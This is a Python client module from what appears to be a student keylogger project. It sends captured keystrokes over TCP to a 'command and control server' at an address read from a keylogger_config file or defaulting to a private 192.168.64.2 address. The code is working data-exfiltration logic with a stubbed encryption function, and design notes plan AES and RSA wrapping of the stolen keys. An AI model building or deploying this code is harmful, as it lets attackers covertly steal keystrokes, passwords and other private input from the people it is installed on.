'''
client.py
Kezia Sharnoff

Take a message of keys inputted and create a new TCP connection to the command 
and control server. Send the keys and close the connection. 

Basics of the TCP connection from Amy Csizmar Dalal CS331 Networks Fall 2025
https://github.com/acdalal/cs331-gopher/blob/main/gopherClient.py


This would be better if it was over UDP, because it would be faster, however I
only have experience with UDP and I appreciate TCP's reliability. 


Input message and send it! Then immediately close connection.


I think the total message should be: 
AES(message) || P_server(AES key) || HASH (message so far)

then server decrypts the AES key and saves it with the IP address in a file
just for fun with the starting timer
do the encryption and hashing stuff AFTER config and setting up the files that
create files!!

server side checks if hash works, then continue (if not then delete)
--> do the hashing LAST! MAYBE NO HASH!
what attack does hashing stop? message being modified in transit or data being lost
that TCP didn't notice

'''	
import socket
import os

SERVER_PORT = 48939
DEFAULT_SERVER = "192.168.64.2"

# Server public key pair, (n,e)
SERVER_n = 616487
SERVER_e = 11

# use aes please I swear....
# def encrypt(msg):

def encrypt(msg):
	pass


def getServerName():
	'''
	Get the server name from the file, named keylogg_config, or use the default
	server! 
	'''

	with open(os.getcwd() + "/testingtesting123.txt", "w") as f:
		f.write("TRYING TO GET THE SERVER NAME!")

	try:
		with open(os.getcwd() + "/keylogger_config", "r") as f:
			return f.read()
	except:
		with open(os.getcwd() + "/testingtesting123.txt", "a") as f:
			f.write("FAILED TO GET SERVER NAME!")
		return DEFAULT_SERVER


def sendMessage(message):
	'''
	Create TCP connection to the server, encode the inputted message,
	send the message, close the connection
	'''
	clientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try: 
		clientSock.connect((getServerName(), SERVER_PORT))
	except:
		print("FAILED TO CONNECT TO SERVER")
		return

	try:
		encoded = message.encode("utf-8")
		clientSock.send(encoded)
	except:
		pass

	clientSock.close()
